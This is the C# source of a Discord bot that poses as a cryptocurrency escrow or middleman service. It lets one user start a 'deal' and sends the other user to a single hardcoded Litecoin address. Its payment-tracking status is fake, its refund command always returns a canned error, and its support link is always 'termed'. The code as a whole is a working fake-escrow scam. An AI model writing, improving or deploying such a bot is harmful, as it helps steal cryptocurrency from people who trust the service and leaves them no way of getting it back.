using Discord;
using Discord.WebSocket;
using Discord.Net;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace DiscordBot
{
    public class Program
    {
        private DiscordSocketClient? _client;
        private readonly Dictionary<string, SessionData> _sessions = new();
        private readonly string _ltcAddress = "Ldu6DNM4NKiW4w9HWSgsh7iVb4RdJymrtS";

        public class SessionData
        {
            public ulong RegisterUserId { get; set; }
            public ulong? LoginUserId { get; set; }
            public string SelectedCrypto { get; set; } = "ltc";
        }

        public static Task Main(string[] args) => new Program().MainAsync();

        public async Task MainAsync()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.Guilds
            });

            _client.Log += Log;
            _client.Ready += Client_Ready;
            _client.SlashCommandExecuted += SlashCommandHandler;
            _client.SelectMenuExecuted += SelectMenuHandler;

            // Reading token from environment variable to keep it secure on GitHub
            var token = Environment.GetEnvironmentVariable("DISCORD_TOKEN");

            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("Error: DISCORD_TOKEN environment variable not set!");
                Console.WriteLine("To run locally, use: $env:DISCORD_TOKEN='your_token_here'; dotnet run");
                return;
            }

            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        public async Task Client_Ready()
        {
            var registerCommand = new SlashCommandBuilder()
                .WithName("register")
                .WithDescription("Create a session and get a 6-digit code")
                .AddOption(new SlashCommandOptionBuilder()
                    .WithName("crypto")
                    .WithDescription("The crypto the other person will see")
                    .WithType(ApplicationCommandOptionType.String)
                    .WithRequired(true)
                    .AddChoice("Litecoin", "ltc")
                    .AddChoice("Bitcoin", "btc")
                    .AddChoice("Ethereum", "eth")
                    .AddChoice("Solana", "sol")
                    .AddChoice("USDT [ERC-20]", "usdt_erc")
                    .AddChoice("USDC [ERC-20]", "usdc_erc")
                    .AddChoice("USDT [SOL]", "usdt_sol")
                    .AddChoice("USDC [SOL]", "usdc_sol"));

            var loginCommand = new SlashCommandBuilder()
                .WithName("login")
                .WithDescription("Join a session using a 6-digit code")
                .AddOption("code", ApplicationCommandOptionType.String, "The 6-digit code", isRequired: true);

            var sendbackCommand = new SlashCommandBuilder()
                .WithName("sendback")
                .WithDescription("Request a refund if scammed");

            var discordCommand = new SlashCommandBuilder()
                .WithName("discord")
                .WithDescription("Get the support server link");

            var liveTransCommand = new SlashCommandBuilder()
                .WithName("livetransactions")
                .WithDescription("View recent LTC transactions");

            try
            {
                await _client.CreateGlobalApplicationCommandAsync(registerCommand.Build());
                await _client.CreateGlobalApplicationCommandAsync(loginCommand.Build());
                await _client.CreateGlobalApplicationCommandAsync(sendbackCommand.Build());
                await _client.CreateGlobalApplicationCommandAsync(discordCommand.Build());
                await _client.CreateGlobalApplicationCommandAsync(liveTransCommand.Build());
            }
            catch (HttpException exception)
            {
                var json = JsonConvert.SerializeObject(exception.Errors, Formatting.Indented);
                Console.WriteLine(json);
            }
        }

        private async Task SlashCommandHandler(SocketSlashCommand command)
        {
            switch (command.Data.Name)
            {
                case "register":
                    await HandleRegisterCommand(command);
                    break;
                case "login":
                    await HandleLoginCommand(command);
                    break;
                case "sendback":
                    await command.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Refund System")
                        .WithDescription("❌ **Error:** Cannot fetch transaction data for refund. Please contact support.")
                        .WithColor(Color.Red)
                        .Build(), ephemeral: true);
                    break;
                case "discord":
                    await command.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Support Server")
                        .WithDescription("⚠️ **Warning:** The server is currently **termed**. Please wait for a new link.")
                        .WithColor(Color.Orange)
                        .Build(), ephemeral: true);
                    break;
                case "livetransactions":
                    await HandleLiveTransactions(command);
                    break;
            }
        }

        private async Task HandleRegisterCommand(SocketSlashCommand command)
        {
            var optionValue = command.Data.Options.First().Value?.ToString();
            var selectedCrypto = optionValue ?? "ltc";
            var random = new Random();
            string code;
            do
            {
                code = random.Next(100000, 999999).ToString();
            } while (_sessions.ContainsKey(code));

            _sessions[code] = new SessionData { RegisterUserId = command.User.Id, SelectedCrypto = selectedCrypto };

            var embed = new EmbedBuilder()
                .WithTitle("Session Created")
                .WithColor(Color.Blue)
                .WithDescription($"Share this unique 6-digit code with the other person: **{code}**\n\nThey must run `/login code:{code}` to begin.")
                .WithFooter(footer => footer.Text = "Waiting for other user to login...")
                .Build();

            await command.RespondAsync(embed: embed, ephemeral: true);
        }

        private async Task HandleLoginCommand(SocketSlashCommand command)
        {
            var code = (string)command.Data.Options.First().Value;

            if (_sessions.TryGetValue(code, out var session))
            {
                if (session.RegisterUserId == command.User.Id)
                {
                    await command.RespondAsync("You cannot login to your own session!", ephemeral: true);
                    return;
                }

                session.LoginUserId = command.User.Id;
                
                var embed = new EmbedBuilder()
                    .WithTitle("Cryptocurrency Deal")
                    .WithColor(Color.Green)
                    .AddField("Fees:", 
                        "Deals $250+: 1%\n" +
                        "Deals under $250: $2\n" +
                        "Deals under $50: $0.50\n" +
                        "**Deals under $10 are FREE**\n" +
                        "USDT & USDC has $1 surcharge")
                    .WithDescription($"The other user has initiated a deal involving: **{GetCryptoDisplayName(session.SelectedCrypto)}**.")
                    .WithFooter(footer => footer.Text = "Select the option below to continue")
                    .Build();

                var menuBuilder = new SelectMenuBuilder()
                    .WithPlaceholder("Make a selection")
                    .WithCustomId($"crypto_selection_{code}")
                    .AddOption(GetCryptoDisplayName(session.SelectedCrypto), session.SelectedCrypto, $"Initiate a {session.SelectedCrypto.ToUpper()} deal");

                var builder = new ComponentBuilder().WithSelectMenu(menuBuilder);
                await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
            }
            else
            {
                await command.RespondAsync("Invalid session code.", ephemeral: true);
            }
        }

        private string GetCryptoDisplayName(string key) => key switch
        {
            "ltc" => "Litecoin",
            "btc" => "Bitcoin",
            "eth" => "Ethereum",
            "sol" => "Solana",
            "usdt_erc" => "USDT [ERC-20]",
            "usdc_erc" => "USDC [ERC-20]",
            "usdt_sol" => "USDT [SOL]",
            "usdc_sol" => "USDC [SOL]",
            _ => key.ToUpper()
        };

        private async Task HandleLiveTransactions(SocketSlashCommand command)
        {
            using var client = new System.Net.Http.HttpClient();
            try
            {
                var response = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
                var data = JsonConvert.DeserializeObject<dynamic>(response);
                
                string height = data?.height?.ToString() ?? "Unknown";
                string n_tx = data?.n_tx?.ToString() ?? "Unknown";
                
                var embed = new EmbedBuilder()
                    .WithTitle("Live LTC Transactions")
                    .WithColor(Color.Purple)
                    .AddField("Latest Block", height, true)
                    .AddField("Total Transactions", n_tx, true)
                    .WithFooter(footer => { footer.Text = "Data provided by BlockCypher API"; })
                    .WithCurrentTimestamp()
                    .Build();

                await command.RespondAsync(embed: embed, ephemeral: true);
            }
            catch
            {
                await command.RespondAsync("Error fetching live transactions.", ephemeral: true);
            }
        }

        private async Task SelectMenuHandler(SocketMessageComponent component)
        {
            if (component.Data.CustomId.StartsWith("crypto_selection_"))
            {
                var selection = component.Data.Values.First();
                
                if (selection == "ltc")
                {
                    await component.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Litecoin Payment")
                        .WithDescription($"Please send your LTC to the following address:\n**{_ltcAddress}**")
                        .AddField("Status", "⏳ Waiting for payment (Tracking enabled via BlockCypher)...")
                        .WithColor(Color.Blue)
                        .Build(), ephemeral: true);
                }
                else
                {
                    await component.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Payment Error")
                        .WithDescription($"❌ No address has been set for **{selection.ToUpper()}** yet.")
                        .WithColor(Color.Red)
                        .Build(), ephemeral: true);
                }
            }
        }
    }
}
